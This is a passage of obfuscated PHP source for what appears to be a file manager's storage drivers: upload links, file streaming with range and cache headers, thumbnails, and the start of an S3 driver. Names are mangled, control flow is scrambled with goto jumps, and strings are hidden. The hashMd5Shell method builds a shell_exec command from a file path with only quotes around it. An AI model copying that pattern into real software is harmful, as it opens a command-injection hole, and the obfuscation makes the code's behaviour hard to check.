$cÖÌÙ‘«Œ‡[$bÂöºÅ—¯[78]] += $f¬ƒ÷¬ç[$bÂöºÅ—¯[78]]; } } } public function fileSubstr($D¶…ÙŠÍªÁ, $C«³Ëí“…, $F›ÁÖßÊÉ¢) { } public function listAll($c‚êÂ„ƒŒƒ) { } public function upload($FÍä–ğ«ñ, $c†öœÇŸ½‰, $D„”´ÓçÌŸ = false, $eÈñ™¨´˜ = REPEAT_REPLACE) { } public function uploadFileByID($CÅá‡‡‹¿, $D¡‘¯ÜÜ‚, $E½‡”Š¶Œ) { } public function uploadFileByPath($FÊâ¢‘§˜¨, $Eİì¶¡, $FóçˆèŒÎË = array()) { } public function isUploadServer() { $Dß—ÕÇ• =& $_SERVER[‘®…¢À]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Dß—ÕÇ•[84]) { return !0; } return $GLOBALS[$Dß—ÕÇ•[6]][$Dß—ÕÇ•[85]][$Dß—ÕÇ•[86]]; } public function isFileOutServer() { $DÍšÚÜ¯Ÿ‚ =& $_SERVER[‘®…¢À]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $DÍšÚÜ¯Ÿ‚[84]) { return !0; } return $GLOBALS[$DÍšÚÜ¯Ÿ‚[6]][$DÍšÚÜ¯Ÿ‚[85]][$DÍšÚÜ¯Ÿ‚[87]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($aõ¥”‚Ğ¹ğ) { $dÙ¬é¢‰ëÃ =& $_SERVER[‘®…¢À]; if (!$this->isCdnHost()) { return $aõ¥”‚Ğ¹ğ; } return str_replace(trim(get_url_root($aõ¥”‚Ğ¹ğ), $dÙ¬é¢‰ëÃ[8]), trim($this->cdnHost, $dÙ¬é¢‰ëÃ[8]), $aõ¥”‚Ğ¹ğ); } public function uploadLink($DœÊÕ¤”ÊÍ, $cÖÙŒ¡È = 0) { goto bìŸãÌ; aÌ×°Çö: $bæ×œªá‚ë = $this->{$A«ÚšŠæ—}($DœÊÕ¤”ÊÍ, $e¡ß‹’œÃí); if ($bæ×œªá‚ë) { $bæ×œªá‚ë[$DÁŸŒ­çØ¥[90]] = $DœÊÕ¤”ÊÍ; $bæ×œªá‚ë[$DÁŸŒ­çØ¥[91]] = $DÔƒ† ’•Ç; } return $bæ×œªá‚ë; goto d¢ğÓ•ä±; bìŸãÌ: $DÁŸŒ­çØ¥ =& $_SERVER[‘®…¢À]; if ($this->isUploadServer()) { return; } $DÔƒ† ’•Ç = $this->getType(); goto AÃ¦ï²Êš¾; AÃ¦ï²Êš¾: if (!in_array($DÔƒ† ’•Ç, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $aƒÄÒØøóá = 1024 * 1024 * 10; goto d®‘èÂÔëŒ; d®‘èÂÔëŒ: $A«ÚšŠæ— = $cÖÙŒ¡È <= $aƒÄÒØøóá ? $DÁŸŒ­çØ¥[88] : $DÁŸŒ­çØ¥[89]; if ($DÔƒ† ’•Ç == $DÁŸŒ­çØ¥[61]) { $A«ÚšŠæ— = $DÁŸŒ­çØ¥[89]; } $e¡ß‹’œÃí = (!$cÖÙŒ¡È ? 1 : ceil($cÖÙŒ¡È / pow(1024, 3))) * 3600 * 4; goto aÌ×°Çö; d¢ğÓ•ä±: } public function uploadFormData($CÊ•ƒ¶, $dÚÀëµìÄË = 3600) { } public function multiUploadFormData($a‚Äğ£–¼, $C›¢¢“°¿Œ = 3600) { } public function osChunkSize() { $eµ’·åƒ¹œ =& $_SERVER[‘®…¢À]; $cºç±Å–”â = (double) $GLOBALS[$eµ’·åƒ¹œ[6]][$eµ’·åƒ¹œ[85]][$eµ’·åƒ¹œ[92]][$eµ’·åƒ¹œ[93]]; if (!$cºç±Å–”â) { $cºç±Å–”â = 1024 * 84 * 10; } return $cºç±Å–”â; } public function download($d”¢¢ë‰Š†, $AËˆ±¥‹Šù) { } public function ext($f¶ö–®Æˆ) { $BÓš¶À»ÆŠ =& $_SERVER[‘®…¢À]; if (strpos($f¶ö–®Æˆ, $BÓš¶À»ÆŠ[8]) === -1) { $aÚŒÍ¥ˆî¦ = $f¶ö–®Æˆ; } else { $aÚŒÍ¥ˆî¦ = $this->pathThis($f¶ö–®Æˆ); } $DŠóÁîŒÇù = $BÓš¶À»ÆŠ[33]; if (strstr($aÚŒÍ¥ˆî¦, $BÓš¶À»ÆŠ[94])) { $DŠóÁîŒÇù = substr($aÚŒÍ¥ˆî¦, strrpos($aÚŒÍ¥ˆî¦, $BÓš¶À»ÆŠ[94]) + 1); $DŠóÁîŒÇù = strtolower($DŠóÁîŒÇù); } if (strlen($DŠóÁîŒÇù) > 3 && preg_match($BÓš¶À»ÆŠ[95], $DŠóÁîŒÇù, $DÅ¿š¬„¸)) { $DŠóÁîŒÇù = $BÓš¶À»ÆŠ[33]; } return $DŠóÁîŒÇù; } public function pathThis($C¡ßñÉãç‘) { $D²ºóôğ‚ =& $_SERVER[‘®…¢À]; $C¡ßñÉãç‘ = str_replace($D²ºóôğ‚[96], $D²ºóôğ‚[8], rtrim($C¡ßñÉãç‘, $D²ºóôğ‚[8])); $dìí„ÑèÖ = strrpos($C¡ßñÉãç‘, $D²ºóôğ‚[8]); if ($dìí„ÑèÖ === !1) { return $C¡ßñÉãç‘; } return substr($C¡ßñÉãç‘, $dìí„ÑèÖ + 1); } public function pathFather($fàÂ™ÏÀƒ™) { $C¬˜òàÂ…Ç =& $_SERVER[‘®…¢À]; $fàÂ™ÏÀƒ™ = str_replace($C¬˜òàÂ…Ç[96], $C¬˜òàÂ…Ç[8], rtrim($fàÂ™ÏÀƒ™, $C¬˜òàÂ…Ç[8])); $dîĞçí¤¬ = strrpos($fàÂ™ÏÀƒ™, $C¬˜òàÂ…Ç[8]); if ($dîĞçí¤¬ === !1) { return $C¬˜òàÂ…Ç[33]; } return substr($fàÂ™ÏÀƒ™, 0, $dîĞçí¤¬ + 1); } public function hashSimple($a»äñ¬¬®) { goto F¶—âØ‹‘»; F¶—âØ‹‘»: $CË†õ”¼À =& $_SERVER[‘®…¢À]; if (!$a»äñ¬¬®) { return md5($CË†õ”¼À[33]); } $Eó†’İÔâ = $this->size($a»äñ¬¬®); goto c†¶¦„©İö; c†¶¦„©İö: $C†ÀÏŒÖ¦“ = 200; $cçÓ–¬µ = 50; if ($Eó†’İÔâ <= $C†ÀÏŒÖ¦“ * $cçÓ–¬µ) { return $this->hashMd5($a»äñ¬¬®) . $Eó†’İÔâ; } goto DÔËÔŸ¶«; DÔËÔŸ¶«: $cĞ¼½ô´ğ† = intval($Eó†’İÔâ / $cçÓ–¬µ); $b•®èÑè‡£ = $CË†õ”¼À[33]; for ($dÚî¿êƒí = 0; $dÚî¿êƒí < $cçÓ–¬µ; $dÚî¿êƒí++) { $b•®èÑè‡£ .= $this->fileSubstr($a»äñ¬¬®, $cĞ¼½ô´ğ† * $dÚî¿êƒí, $C†ÀÏŒÖ¦“); } goto e‘èö¬™”¦; e‘èö¬™”¦: $b•®èÑè‡£ .= $this->fileSubstr($a»äñ¬¬®, $Eó†’İÔâ - $C†ÀÏŒÖ¦“, $C†ÀÏŒÖ¦“); return md5($b•®èÑè‡£) . $Eó†’İÔâ; goto a‘×ˆÛÛÑ; a‘×ˆÛÛÑ: } public static $md5Cache = array(); public function hashMd5($F¹İ¡£šºÆ) { $F¹İ¡£šºÆ = $this->iconvSystem($F¹İ¡£šºÆ); if (isset(self::$md5Cache[$F¹İ¡£šºÆ])) { return self::$md5Cache[$F¹İ¡£šºÆ]; } self::$md5Cache[$F¹İ¡£šºÆ] = $this->hashMd5Shell($F¹İ¡£šºÆ); if (!self::$md5Cache[$F¹İ¡£šºÆ]) { self::$md5Cache[$F¹İ¡£šºÆ] = @md5_file($F¹İ¡£šºÆ); } return self::$md5Cache[$F¹İ¡£šºÆ]; } private function hashMd5Shell($E‰½‚íˆñ) { goto C ò¶ŞãŒ†; E™¡ğ§£Şá: $f“ÛÏŞ°†Ï = Cache::get($cÔ×¦ëò[100]); if (!$f“ÛÏŞ°†Ï) { $e ÏØºÏ¹ = BASIC_PATH . $cÔ×¦ëò[101]; $D‰–¢—òƒË = md5_file($e ÏØºÏ¹); $f“ÛÏŞ°†Ï = $cÔ×¦ëò[102]; foreach ($BÊòë¿îÁ as $béÙƒ½ÚÕß) { $bŒµ—Ÿ„Œ­ = shell_exec($béÙƒ½ÚÕß . "\x20\x22{$e ÏØºÏ¹}\x22"); if ($bŒµ—Ÿ„Œ­ && substr(trim($bŒµ—Ÿ„Œ­), 0, 32) == $D‰–¢—òƒË) { $f“ÛÏŞ°†Ï = $béÙƒ½ÚÕß; break; } } Cache::set($cÔ×¦ëò[100], $f“ÛÏŞ°†Ï, 3600); } if ($f“ÛÏŞ°†Ï == $cÔ×¦ëò[102]) { return !1; } goto Aô±•É‰; C ò¶ŞãŒ†: $cÔ×¦ëò =& $_SERVER[‘®…¢À]; if (!function_exists($cÔ×¦ëò[97])) { return !1; } $BÊòë¿îÁ = array($cÔ×¦ëò[98], $cÔ×¦ëò[99]); goto E™¡ğ§£Şá; Aô±•É‰: $bŒµ—Ÿ„Œ­ = shell_exec($f“ÛÏŞ°†Ï . "\x20\x22{$E‰½‚íˆñ}\x22"); return substr($bŒµ—Ÿ„Œ­, 0, 32); goto F‚‰Âš…ˆ°; F‚‰Âš…ˆ°: } public function link($FáìÇæ¼à) { return $FáìÇæ¼à; } public function fileOut($a¥Âˆªùİö, $E…‹‹Ê¶‰ = false, $c†¥…”’» = false, $bíÂßÑğòÂ = '') { goto cø²ÄÓ°¤ô; f³¿ï™©‹İ: header($fŠšæäÍµÖ[122]); header($fŠšæäÍµÖ[123] . $d´ù»®•ğ¦); header($fŠšæäÍµÖ[124] . gmdate($fŠšæäÍµÖ[107], time() + 3600 * 24 * 30) . $fŠšæäÍµÖ[125]); goto Ašó…†÷˜­; FÎÄ¡ÏÍ•˜: $f½åº±Ù³‘ = $this->getType() == $fŠšæäÍµÖ[104]; $fÔÎ²‡«²Ù = $GLOBALS[$fŠšæäÍµÖ[6]][$fŠšæäÍµÖ[85]][$fŠšæäÍµÖ[92]][$fŠšæäÍµÖ[105]]; $DàÆÚïäò = (double) $GLOBALS[$fŠšæäÍµÖ[6]][$fŠšæäÍµÖ[85]][$fŠšæäÍµÖ[92]][$fŠšæäÍµÖ[106]] * 1024 * 1024; goto B¥¸‰›ˆÜø; cÕÍĞŞ—…ƒ: header($fŠšæäÍµÖ[133] . $AèÄ»ğÃ‡ . $fŠšæäÍµÖ[125]); header($fŠšæäÍµÖ[134] . $D¯Š‚‰—İã); header($fŠšæäÍµÖ[135]); goto bÄ«¦ëù; cø²ÄÓ°¤ô: $fŠšæäÍµÖ =& $_SERVER[‘®…¢À]; $this->cacheMethod(null, null); if (!$a¥Âˆªùİö || !$this->exist($a¥Âˆªùİö)) { show_json(LNG($fŠšæäÍµÖ[103]), !1, $c†¥…”’»); } goto FÎÄ¡ÏÍ•˜; A»èÀ½æ¾: $a¯Ãäí³ÂË = $fäÈÎ®‚ö°[$fŠšæäÍµÖ[78]]; $AèÄ»ğÃ‡ = gmdate($fŠšæäÍµÖ[107], $fäÈÎ®‚ö°[$fŠšæäÍµÖ[108]]); $D¯Š‚‰—İã = $c†¥…”’» ? $c†¥…”’» : $this->iconvApp($fäÈÎ®‚ö°[$fŠšæäÍµÖ[28]]); goto E–Ùšä…œ‹; Ašó…†÷˜­: header($fŠšæäÍµÖ[126]); header($fŠšæäÍµÖ[127]); header($fŠšæäÍµÖ[128]); goto aÊ±„×õšå; c¯óÜÔ¼¾Ë: $d´ù»®•ğ¦ = get_file_mime($a†˜í¥…ğ¥); if (strstr($d´ù»®•ğ¦, $fŠšæäÍµÖ[115])) { $d´ù»®•ğ¦ = $d´ù»®•ğ¦ . $fŠšæäÍµÖ[116]; } if ($E…‹‹Ê¶‰ === !1 && !mime_support($d´ù»®•ğ¦)) { $E…‹‹Ê¶‰ = !0; $d´ù»®•ğ¦ = $fŠšæäÍµÖ[117]; } goto a¥÷’÷Ú­ñ; eÅËª³È§: if ($f½åº±Ù³‘ && $A˜öšâíº¶ && $fÔÎ²‡«²Ù) { if (strstr($A˜öšâíº¶, $fŠšæäÍµÖ[139])) { header($fŠšæäÍµÖ[140] . $a¥Âˆªùİö); } else { if (strstr($A˜öšâíº¶, $fŠšæäÍµÖ[141])) { header($fŠšæäÍµÖ[142] . $a¥Âˆªùİö); } else { if (strstr($A˜öšâíº¶, $fŠšæäÍµÖ[143])) { header($fŠšæäÍµÖ[144] . $a¥Âˆªùİö); } } } if ($DàÆÚïäò) { header($fŠšæäÍµÖ[145] . $DàÆÚïäò); } return; } if (isset($_SERVER[$fŠšæäÍµÖ[146]])) { if (preg_match($fŠšæäÍµÖ[147], $_SERVER[$fŠšæäÍµÖ[146]], $B·ÔÒæªÎ)) { $d›ñ§ØœÌ³ = intval($B·ÔÒæªÎ[1]); if (!empty($B·ÔÒæªÎ[2])) { $DÑğøÓ†ò = intval($B·ÔÒæªÎ[2]); } } header($fŠšæäÍµÖ[148]); header("\103\x6f\156\x74\145\x6e\164\55\x52\x61\156\x67\x65\72\40\142\171\x74\145\163\40{$d›ñ§ØœÌ³}\x2d{$DÑğøÓ†ò}\57" . $a¯Ãäí³ÂË); } else { header($fŠšæäÍµÖ[149]); } header($fŠšæäÍµÖ[150] . ($DÑğøÓ†ò - $d›ñ§ØœÌ³ + 1)); goto f±ëÄÖğâî; f±ëÄÖğâî: if ($_SERVER[$fŠšæäÍµÖ[151]] == $fŠšæäÍµÖ[152]) { return; } $a¬á™ÅÕ·÷ = 1024 * 100; $B‘ËÕè—‹Ê = 0; goto cÓ§é—§; B¥¸‰›ˆÜø: @ob_end_clean(); set_timeout(); $fäÈÎ®‚ö° = $this->infoFull($a¥Âˆªùİö); goto A»èÀ½æ¾; bÄ«¦ëù: header($fŠšæäÍµÖ[136] . $a¯Ãäí³ÂË); header($fŠšæäÍµÖ[137]); $A˜öšâíº¶ = strtolower($_SERVER[$fŠšæäÍµÖ[138]]); goto eÅËª³È§; E–Ùšä…œ‹: $d›ñ§ØœÌ³ = 0; $DÑğøÓ†ò = $a¯Ãäí³ÂË - 1; $a†˜í¥…ğ¥ = $this->ext($D¯Š‚‰—İã); goto b×„†Şøåï; b×„†Şøåï: if (in_array($a†˜í¥…ğ¥, array($fŠšæäÍµÖ[109], $fŠšæäÍµÖ[110], $fŠšæäÍµÖ[111], $fŠšæäÍµÖ[112]))) { $a†˜í¥…ğ¥ = $fŠšæäÍµÖ[113]; } if (!$bíÂßÑğòÂ) { $bíÂßÑğòÂ = md5($AèÄ»ğÃ‡ . $this->hashSimple($a¥Âˆªùİö)); } $bíÂßÑğòÂ = $fŠšæäÍµÖ[114] . $bíÂßÑğòÂ . $fŠšæäÍµÖ[114]; goto c¯óÜÔ¼¾Ë; cÓ§é—§: if ($DàÆÚïäò) { $B‘ËÕè—‹Ê = intval(1000 * 1000 * ($a¬á™ÅÕ·÷ / $DàÆÚïäò)); } while ($d›ñ§ØœÌ³ <= $DÑğøÓ†ò) { $Bïá¨øßË› = timeFloat(); check_abort(); $D»™†àÀ‘ = $DÑğøÓ†ò - $d›ñ§ØœÌ³ + 1; if ($D»™†àÀ‘ <= $a¬á™ÅÕ·÷) { $a¬á™ÅÕ·÷ = $D»™†àÀ‘; } echo $this->fileSubstr($a¥Âˆªùİö, $d›ñ§ØœÌ³, $a¬á™ÅÕ·÷); $d›ñ§ØœÌ³ += $a¬á™ÅÕ·÷; if ($a¬á™ÅÕ·÷ == $D»™†àÀ‘) { $d›ñ§ØœÌ³ = $DÑğøÓ†ò + 1; } if ($B‘ËÕè—‹Ê) { $DÀ‘¹èšì = intval(1000 * 1000 * (timeFloat() - $Bïá¨øßË›)); $B÷ÛïĞæàµ = $B‘ËÕè—‹Ê - $DÀ‘¹èšì; if ($B÷ÛïĞæàµ > 5) { usleep($B÷ÛïĞæàµ); } } } goto fô±ä¾Ñ; aÊ±„×õšå: if (isset($_SERVER[$fŠšæäÍµÖ[129]]) && strtotime($_SERVER[$fŠšæäÍµÖ[129]]) == $fäÈÎ®‚ö°[$fŠšæäÍµÖ[108]]) { header($fŠšæäÍµÖ[130], !0, 304); die; } if (isset($_SERVER[$fŠšæäÍµÖ[131]]) && $_SERVER[$fŠšæäÍµÖ[131]] == $bíÂßÑğòÂ) { header($fŠšæäÍµÖ[132] . $bíÂßÑğòÂ, !0, 304); die; } header($fŠšæäÍµÖ[132] . $bíÂßÑğòÂ); goto cÕÍĞŞ—…ƒ; a¥÷’÷Ú­ñ: $FĞ±ÆŸÛá„ = rawurlencode($D¯Š‚‰—İã); $FĞ±ÆŸÛá„ = $fŠšæäÍµÖ[114] . $FĞ±ÆŸÛá„ . $fŠšæäÍµÖ[118] . $FĞ±ÆŸÛá„; if ($E…‹‹Ê¶‰) { header($fŠšæäÍµÖ[119]); header($fŠšæäÍµÖ[120] . $FĞ±ÆŸÛá„); } else { header($fŠšæäÍµÖ[121] . $FĞ±ÆŸÛá„); } goto f³¿ï™©‹İ; fô±ä¾Ñ: } public function fileOutServer($E¸³î Î–Û, $a¡±Éøï• = false, $CÛÈÓ­ºò’ = false, $BĞÊ¼ª… = '') { $this->fileOut($E¸³î Î–Û, $a¡±Éøï•, $CÛÈÓ­ºò’, $BĞÊ¼ª…); } public function fileOutLink($c¾‚Å§‚Ï) { header($_SERVER[‘®…¢À][153] . $c¾‚Å§‚Ï); die; } public function cacheMethod($e°‚ó¦¢, $aÈáÌë¯ ) { goto aÇãäå‰¸‰; F ˆóå«Öº: if (!is_null($då¼œÄ°‘×)) { return $då¼œÄ°‘×; } $då¼œÄ°‘× = $this->{$e°‚ó¦¢}($aÈáÌë¯ ); $A³‘äŸ‚Ö¹[$b“×£›ƒç‰] = $då¼œÄ°‘×; goto aÀ¹ôÆøÄ; BÕŞ¾¿¤á: if (is_null($e°‚ó¦¢)) { $A³‘äŸ‚Ö¹ = array(); return; } if (is_null($aÈáÌë¯ )) { unset($A³‘äŸ‚Ö¹[$b“×£›ƒç‰]); return; } $då¼œÄ°‘× = isset($A³‘äŸ‚Ö¹[$b“×£›ƒç‰]) ? $A³‘äŸ‚Ö¹[$b“×£›ƒç‰] : null; goto F ˆóå«Öº; aÇãäå‰¸‰: $BÔÏíŒê =& $_SERVER[‘®…¢À]; static $A³‘äŸ‚Ö¹ = array(); $b“×£›ƒç‰ = $BÔÏíŒê[154] . $e°‚ó¦¢ . $BÔÏíŒê[155] . rtrim($aÈáÌë¯ , $BÔÏíŒê[8]); goto BÕŞ¾¿¤á; aÀ¹ôÆøÄ: return $då¼œÄ°‘×; goto A‚Í«…°‡; A‚Í«…°‡: } public function fileOutImage($EïÕ›á‡, $cÌ—ÍÒÇ£µ = 250) { goto Cô”ëîì”¯; FÉÄ•¬Ş‡ª: if (!($AŞ‘Ó²¨³à = IO::move($b”õ­òœØá, $A¥íĞÓÜß°))) { return IO::fileOut($b”õ­òœØá); } del_file($b”õ­òœØá); IO::fileOut($AŞ‘Ó²¨³à); goto B‚óÃÔÓµè; DĞ£Áƒæº: if ($cµÌÍ­óµ[$bÌ°Î½²¿ï[78]] <= 1024 * 50 || !function_exists($bÌ°Î½²¿ï[156]) || $cµÌÍ­óµ[$bÌ°Î½²¿ï[157]] == $bÌ°Î½²¿ï[158]) { return $this->fileOut($EïÕ›á‡); } if (isset($cµÌÍ­óµ[$bÌ°Î½²¿ï[159]][$bÌ°Î½²¿ï[160]])) { $bÁ‰æ®ÙøÛ = $cµÌÍ­óµ[$bÌ°Î½²¿ï[159]][$bÌ°Î½²¿ï[160]]; } else { if (isset($cµÌÍ­óµ[$bÌ°Î½²¿ï[159]][$bÌ°Î½²¿ï[161]])) { $bÁ‰æ®ÙøÛ = $cµÌÍ­óµ[$bÌ°Î½²¿ï[159]][$bÌ°Î½²¿ï[161]]; } else { $bÁ‰æ®ÙøÛ = md5("{$cµÌÍ­óµ[$bÌ°Î½²¿ï[28]]}\x5f{$cµÌÍ­óµ[$bÌ°Î½²¿ï[76]]}\137{$cµÌÍ­óµ[$bÌ°Î½²¿ï[78]]}"); } } $cŠ†Ñ‹¼ = "{$bÁ‰æ®ÙøÛ}\x5f{$cÌ—ÍÒÇ£µ}\x2e\160\x6e\x67"; goto E°ĞšÕ½Ò¦; E°ĞšÕ½Ò¦: if (!($F„ñÑãøÓ” = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $bÌ°Î½²¿ï[162]))) { $A¥íĞÓÜß° = IO::mkdir(IO_PATH_SYSTEM_TEMP . $bÌ°Î½²¿ï[163]); } else { $A¥íĞÓÜß° = KodIO::make($F„ñÑãøÓ”); } if ($F„ñÑãøÓ” = IO::fileNameExist($A¥íĞÓÜß°, $cŠ†Ñ‹¼)) { $b”õ­òœØá = KodIO::make($F„ñÑãøÓ”); return IO::fileOut($b”õ­òœØá); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto bêÈ Ìö½í; bêÈ Ìö½í: $b”õ­òœØá = DATA_THUMB . $cŠ†Ñ‹¼; if (!@file_exists($b”õ­òœØá)) { $EÉŠÍĞÊ… = TEMP_FILES; if (!is_dir($EÉŠÍĞÊ…)) { mk_dir($EÉŠÍĞÊ…); } $fÅ„Úƒ‰´ = $EÉŠÍĞÊ… . $bÁ‰æ®ÙøÛ . $bÌ°Î½²¿ï[94] . $cµÌÍ­óµ[$bÌ°Î½²¿ï[157]]; if (!@file_exists($fÅ„Úƒ‰´)) { $fÅ„Úƒ‰´ = $this->download($EïÕ›á‡, $fÅ„Úƒ‰´); } $E‹÷ÅŠåí§ = new ImageThumb($fÅ„Úƒ‰´, $bÌ°Î½²¿ï[164]); $E‹÷ÅŠåí§->prorate($b”õ­òœØá, $cÌ—ÍÒÇ£µ, $cÌ—ÍÒÇ£µ); } if (!file_exists($b”õ­òœØá) || filesize($b”õ­òœØá) < 100) { return @file_exists($fÅ„Úƒ‰´) ? IO::fileOut($fÅ„Úƒ‰´) : $this->fileOut($EïÕ›á‡); } goto FÉÄ•¬Ş‡ª; Cô”ëîì”¯: $bÌ°Î½²¿ï =& $_SERVER[‘®…¢À]; if (substr($EïÕ›á‡, 0, 4) == $bÌ°Î½²¿ï[143]) { $this->fileOutLink($EïÕ›á‡); } $cµÌÍ­óµ = $this->info($EïÕ›á‡); goto DĞ£Áƒæº; B‚óÃÔÓµè: } public function fileOutImageServer($B›§İâ¨Ô¨, $EØ’à­„ñó = 250) { $this->fileOutImage($B›§İâ¨Ô¨, $EØ’à­„ñó); } public function fileNameAuto($eÁØŒÇªî», $BÛä÷Ô‘¥, $aÊ†¡›½„ò = REPEAT_RENAME, $cô‰¹–¸ö = false) { goto c…æ”ÙğÆ; cÔ…‘ìğ‡: if ($aÊ†¡›½„ò == REPEAT_SKIP) { return !1; } $Eßåñ”õ°‘ = $Bî²ùØ‹«[94] . get_path_ext($BÛä÷Ô‘¥); $Eßåñ”õ°‘ = $Eßåñ”õ°‘ == $Bî²ùØ‹«[94] || $cô‰¹–¸ö ? $Bî²ùØ‹«[33] : $Eßåñ”õ°‘; goto d„±¬ÃÚ×ª; c…æ”ÙğÆ: $Bî²ùØ‹« =& $_SERVER[‘®…¢À]; $FâŠ•ºâùí = $eÁØŒÇªî» === $Bî²ùØ‹«[33] ? $BÛä÷Ô‘¥ : rtrim($eÁØŒÇªî», $Bî²ùØ‹«[8]) . $Bî²ùØ‹«[8] . $BÛä÷Ô‘¥; if ($aÊ†¡›½„ò == REPEAT_REPLACE || !$this->exist($FâŠ•ºâùí) || $cô‰¹–¸ö && $aÊ†¡›½„ò != REPEAT_RENAME_FOLDER) { return $BÛä÷Ô‘¥; } goto cÔ…‘ìğ‡; d„±¬ÃÚ×ª: $bÊù¬×ÂÅ… = 1; $B·†²—Ãğù = substr($BÛä÷Ô‘¥, 0, strlen($BÛä÷Ô‘¥) - strlen($Eßåñ”õ°‘)); $a¶‰¼ÔĞŠŞ = $B·†²—Ãğù . "\50{$bÊù¬×ÂÅ…}\51{$Eßåñ”õ°‘}"; goto c®‰Œ§˜Ó; c®‰Œ§˜Ó: while ($this->exist(rtrim($eÁØŒÇªî», $Bî²ùØ‹«[8]) . $Bî²ùØ‹«[8] . $a¶‰¼ÔĞŠŞ)) { $a¶‰¼ÔĞŠŞ = $B·†²—Ãğù . "\x28{$bÊù¬×ÂÅ…}\x29{$Eßåñ”õ°‘}"; $bÊù¬×ÂÅ…++; } return $a¶‰¼ÔĞŠŞ; goto C×ÎéÇ±ó÷; C×ÎéÇ±ó÷: } public function listAllFiles($cÖ¼á‘®˜ö, $d†ù™Â×ï, $bèÕê£ò¶ = array()) { goto c¯‹áƒŞ¿; B‡º‹ô³‘×: $cÖ¼á‘®˜ö = trim($cÖ¼á‘®˜ö, $e§ŒÎ‰®¢[8]); foreach ($d†ù™Â×ï as $D•“ÜÃ£•¿) { $Aâ¶‘ÑŠ»õ = ltrim(substr($D•“ÜÃ£•¿, strlen($cÖ¼á‘®˜ö)), $e§ŒÎ‰®¢[8]); $F·µÂìÂÔ‡ = array_merge($F·µÂìÂÔ‡, $this->slicePath($Aâ¶‘ÑŠ»õ)); } $F÷Ì’•¿ôÓ = array(); goto aô˜Æ«èÙè; c¯‹áƒŞ¿: $e§ŒÎ‰®¢ =& $_SERVER[‘®…¢À]; if (empty($d†ù™Â×ï)) { return array(); } $F·µÂìÂÔ‡ = array(); goto B‡º‹ô³‘×; aô˜Æ«èÙè: foreach (array_unique($F·µÂìÂÔ‡) as $D•“ÜÃ£•¿) { $E¬Œ˜èÒ°’ = array($e§ŒÎ‰®¢[76] => $this->getPathOuter($e§ŒÎ‰®¢[8] . $cÖ¼á‘®˜ö . $e§ŒÎ‰®¢[8] . $D•“ÜÃ£•¿), $e§ŒÎ‰®¢[77] => 1, $e§ŒÎ‰®¢[78] => 0); if (substr($D•“ÜÃ£•¿, -1) != $e§ŒÎ‰®¢[8]) { $E¬Œ˜èÒ°’[$e§ŒÎ‰®¢[77]] = 0; $EÃìÇË¯¸Ô = $this->getPath($cÖ¼á‘®˜ö . $e§ŒÎ‰®¢[8] . $D•“ÜÃ£•¿); $E¬Œ˜èÒ°’[$e§ŒÎ‰®¢[78]] = isset($bèÕê£ò¶[$EÃìÇË¯¸Ô]) ? $bèÕê£ò¶[$EÃìÇË¯¸Ô] : $this->size($EÃìÇË¯¸Ô); } $F÷Ì’•¿ôÓ[] = $E¬Œ˜èÒ°’; } return $F÷Ì’•¿ôÓ; goto fš¼ï±í†; fš¼ï±í†: } public function slicePath($A§–Ó«¢³³) { $Cß†ƒ£ëÙÕ =& $_SERVER[‘®…¢À]; $c‡½ŒÙÒ»¥ = explode($Cß†ƒ£ëÙÕ[8], trim($A§–Ó«¢³³, $Cß†ƒ£ëÙÕ[8])); $c„ŠÔ¥ì›› = 0; do { ++$c„ŠÔ¥ì››; $E‡ÈÅåËîÅ[] = implode($Cß†ƒ£ëÙÕ[8], array_slice($c‡½ŒÙÒ»¥, 0, $c„ŠÔ¥ì››)) . $Cß†ƒ£ëÙÕ[8]; } while ($c„ŠÔ¥ì›› < count($c‡½ŒÙÒ»¥)); $E‡ÈÅåËîÅ[count($c‡½ŒÙÒ»¥) - 1] = $A§–Ó«¢³³; return $E‡ÈÅåËîÅ; } public function getHost() { $c¶ŸÙÒ°™ =& $_SERVER[‘®…¢À]; $EØ¤¨¢Î¥¯ = parse_url(trim($this->domain, $c¶ŸÙÒ°™[8])); $C°“Ñá…À = isset($EØ¤¨¢Î¥¯[$c¶ŸÙÒ°™[165]]) ? $EØ¤¨¢Î¥¯[$c¶ŸÙÒ°™[165]] : http_type(); $e¬¦êÓ®¬¶ = isset($EØ¤¨¢Î¥¯[$c¶ŸÙÒ°™[166]]) ? $EØ¤¨¢Î¥¯[$c¶ŸÙÒ°™[166]] : $EØ¤¨¢Î¥¯[$c¶ŸÙÒ°™[76]]; if (isset($EØ¤¨¢Î¥¯[$c¶ŸÙÒ°™[167]])) { $e¬¦êÓ®¬¶ .= $c¶ŸÙÒ°™[4] . $EØ¤¨¢Î¥¯[$c¶ŸÙÒ°™[167]]; } return $C°“Ñá…À . $c¶ŸÙÒ°™[168] . $e¬¦êÓ®¬¶; } public function pathEncode($C¯é‚ˆ•­) { $Fî‰‡Ø‰•é =& $_SERVER[‘®…¢À]; return str_replace($Fî‰‡Ø‰•é[169], $Fî‰‡Ø‰•é[8], rawurlencode($C¯é‚ˆ•­)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($CÏ¨Îùª×Ó) { set_timeout(); require_once SDK_DIR . $_SERVER[‘®…¢À][170]; parent::__construct(); $this->_init($CÏ¨Îùª×Ó); } public function _init($AŠ¼Å´Ó´Ë) { foreach ($AŠ¼Å´Ó´Ë as $d™ä›á‹À¶ => $B¬´Ú‰¹’) { if (isset($this->{$d™ä›á‹À¶})) { $this->{$d™ä›á‹À¶} = $B¬´Ú‰¹’; } } $this->endpoint = $AŠ¼Å´Ó´Ë[$_SERVER[‘®…¢À][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($bñÜÀâˆ×Æ = "\166\x34") { $this->signVer = $bñÜÀâˆ×Æ; $this->client->setSignatureVersion($bñÜÀâˆ×Æ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return 